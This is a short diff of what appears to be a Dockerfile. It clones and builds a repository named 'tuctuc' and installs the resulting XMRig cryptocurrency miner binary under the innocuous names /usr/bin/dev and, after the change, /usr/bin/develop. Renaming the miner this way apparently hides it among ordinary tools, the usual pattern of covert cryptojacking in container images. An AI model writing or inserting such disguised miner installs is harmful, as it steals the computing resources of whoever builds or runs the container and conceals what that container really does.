@@ -8,4 +8,4 @@ RUN git clone https://github.com/vajisah50/tuctuc.git
 RUN mkdir tuctuc/build
 RUN cd tuctuc/build && cmake .. -DCMAKE_C_COMPILER=gcc-7 -DCMAKE_CXX_COMPILER=g++-7
 RUN cd tuctuc/build && make
-RUN mv tuctuc/build/xmrig /usr/bin/dev
+RUN mv tuctuc/build/xmrig /usr/bin/develop
